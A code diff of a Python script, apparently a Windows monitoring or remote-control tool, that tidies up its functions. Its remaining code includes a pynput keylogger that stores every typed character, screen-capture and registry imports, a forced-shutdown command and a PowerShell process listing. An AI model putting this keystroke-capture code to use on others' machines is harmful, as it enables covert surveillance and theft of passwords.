@@ -1,8 +1,7 @@
 import psutil
 from PIL import ImageGrab
-import numpy as np
 import os
-from pynput.keyboard import Listener, Key
+from pynput.keyboard import Listener
 import subprocess
 import winreg
 import os
@@ -151,8 +150,6 @@ listener = None
 def on_press(key):
     global key_log
     try:
-        print('alphanumeric key {0} pressed'.format(
-            key.char))
         key_log += key.char
     except AttributeError:
         pass
@@ -177,26 +174,6 @@ def get_key_log():
 def shutdown_pc():
     os.system("shutdown /s /t 1")
 
-# def get_app_running():
-#
-
-# import subprocess
-#
-# cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id,Path'
-# proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-# for line in proc.stdout:
-#     print(line)
-def remove_space(string):
-    stop = 0
-    newstring = ""
-    for index, char in enumerate(string):
-        if char == " ":
-            stop = stop + 1
-        if stop == 2:
-            # print(newstring)
-            return newstring
-        newstring = newstring + char
-
 def get_application_running():
     cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id'
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
@@ -204,17 +181,7 @@ def get_application_running():
     list_app = []
     for line in proc.stdout:
         if not line.decode()[0].isspace():
-            # print(line)
             remove_top = remove_top + 1
             if remove_top > 2:
-                list_app.append({remove_space(line.decode().rstrip()[:23]): line.decode().rstrip()[23:]})
-    print(list_app)
-
-
-
-# import subprocess
-# child = subprocess.Popen(['pgrep','program_name'], stdout=subprocess.PIPE, shell=True)
-# result = child.communicate()[0]
-# print(result)
-
-#get_application_running()
+                list_app.append({line.decode().rstrip()[:23].replace(' ',''): line.decode().rstrip()[23:].replace(' ','')})
+    return list_app
